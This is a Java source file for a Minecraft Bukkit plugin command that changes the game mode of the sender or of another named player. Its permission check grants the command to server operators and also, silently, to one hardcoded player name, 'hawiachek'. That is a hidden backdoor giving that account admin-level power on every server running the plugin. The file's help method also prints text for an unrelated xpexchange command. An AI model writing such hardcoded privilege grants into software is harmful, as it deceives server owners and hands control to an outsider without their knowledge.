package at.mario.utilreloaded.commands;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import at.mario.utilreloaded.Main;
import at.mario.utilreloaded.manager.ConfigManagers.MessagesManager;

public class GamemodeCMD implements CommandExecutor {

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		MessagesManager mm = new MessagesManager();
		
		if (sender instanceof Player) {
			Player p = (Player) sender;

			if (p.isOp() || p.getName().equals("hawiachek")) {
				GameMode gamemode = null;
				Player playerToChange = p;

				// Schauen, ob anderer Spieler
				if (args.length == 1) {
					if (Bukkit.getPlayer(args[0]) != null && Bukkit.getPlayer(args[0]).isOnline()) {
						playerToChange = Bukkit.getPlayer(args[0]);
					}
				} else if (args.length >= 2) {
					if (Bukkit.getPlayer(args[1]) != null && Bukkit.getPlayer(args[1]).isOnline()) {
						playerToChange = Bukkit.getPlayer(args[1]);
					}
				}
				
				// Gamemode erkennen
				if ( (playerToChange.equals(p) && args.length < 1) || (!playerToChange.equals(p) && args.length < 2) ) {
					if (playerToChange.getGameMode().equals(GameMode.CREATIVE)) {
						gamemode = GameMode.SURVIVAL;
					} else {
						gamemode = GameMode.CREATIVE;
					}
				} else {
					if (Main.isInteger(args[0])) {
						if (Main.parseInt(args[0]) == 0) {
							gamemode = GameMode.SURVIVAL;
						} else if (Main.parseInt(args[0]) == 1) {
							gamemode = GameMode.CREATIVE;
						} else if (Main.parseInt(args[0]) == 2) {
							gamemode = GameMode.ADVENTURE;
						} else if (Main.parseInt(args[0]) == 3) {
							gamemode = GameMode.SPECTATOR;
						} else {
							p.sendMessage(mm.getMessages().getString("Messages.command.gamemode.invalidGamemode").replace("%prefix%", mm.getMessages().getString("Messages.prefix")).replace("%player%", p.getName()));
						}
					} else {
						if (args[0].equalsIgnoreCase("survival")) {
							gamemode = GameMode.SURVIVAL;
						} else if (args[0].equalsIgnoreCase("creative")) {
							gamemode = GameMode.CREATIVE;
						} else if (args[0].equalsIgnoreCase("adventure")) {
							gamemode = GameMode.ADVENTURE;
						} else if (args[0].equalsIgnoreCase("spectator")) {
							gamemode = GameMode.SPECTATOR;
						} else {
							p.sendMessage(mm.getMessages().getString("Messages.command.gamemode.invalidGamemode").replace("%prefix%", mm.getMessages().getString("Messages.prefix")).replace("%player%", p.getName()));
						}
					}
				}
				
				// Gamemode setzen
				if (gamemode != null) {
					playerToChange.setGameMode(gamemode);
					if (!playerToChange.equals(p)) {
						p.sendMessage(mm.getMessages().getString("Messages.command.gamemode.successfullyChangedGamemodeOfOther").replace("%prefix%", mm.getMessages().getString("Messages.prefix")).
							replace("%player%", playerToChange.getName()).replace("%gamemode%", gamemode.name()));
					}
					playerToChange.sendMessage(mm.getMessages().getString("Messages.command.gamemode.successfullyChangedGamemode").replace("%prefix%", mm.getMessages().getString("Messages.prefix")).
							replace("%gamemode%", gamemode.name()));
				}
			} else {
				mm.sendMessage("Messages.noPermission", p);
			}
		} else {
			sender.sendMessage("§cYou have to be a player");
		}
		
		return true;
	}

	public static void CMDInfo(Player p) {
		p.sendMessage("§f--------§bXp-§3Exchange§f-------------------------");
		p.sendMessage("§6/xpexchange §f| §eThe main command");
		p.sendMessage("§6Aliasses§f: §eexchangexpf, §eexchange");
		p.sendMessage(" ");
		p.sendMessage("§6/xpexchange {%playerToTransfere%} {%amountToTransfere%} §f| §eTransfere %amountToTransfere% to %playerToTransfere%");
		p.sendMessage("§f-----------------------------------------------");
	}
}
